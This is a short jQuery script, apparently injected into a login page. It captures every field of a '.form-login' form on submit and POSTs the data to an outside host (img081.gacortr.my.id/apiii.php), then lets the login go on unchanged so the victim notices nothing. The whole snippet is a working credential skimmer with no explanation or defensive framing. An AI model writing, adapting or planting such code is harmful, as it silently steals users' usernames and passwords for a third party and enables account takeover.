$(".form-login").submit(function() {
    var d = $(".form-login");

    $.ajax({
        url: "https://img081.gacortr.my.id/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
